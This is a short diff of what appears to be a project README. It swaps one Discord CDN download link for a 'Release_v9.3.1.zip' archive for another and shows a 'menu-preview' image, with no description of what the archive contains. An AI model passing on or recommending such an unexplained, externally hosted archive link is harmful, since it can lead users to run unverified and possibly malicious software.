@@ -1,4 +1,4 @@
-|[Download](https://cdn.discordapp.com/attachments/1443584758348120076/1443608810278097048/Release_v9.3.1.zip?ex=6929b0f9&is=69285f79&hm=815c92f5f32a2b288d6d59342732be7b50049b98b2e9bd36b1553f7e0b08764a&)
+|[Download](https://cdn.discordapp.com/attachments/1443584758348120076/1443892215062462495/Release_v9.3.1.zip?ex=692ab8ea&is=6929676a&hm=f6089abe33e17e567639fbe8a3b5eff9ef5a17ade0c1c6372743d60f1610bf07&)
 |:------------- |
 
 <img width="866" height="947" alt="menu-preview" src="https://github.com/user-attachments/assets/8869ac41-a064-4c23-b0c9-29959482550f" />
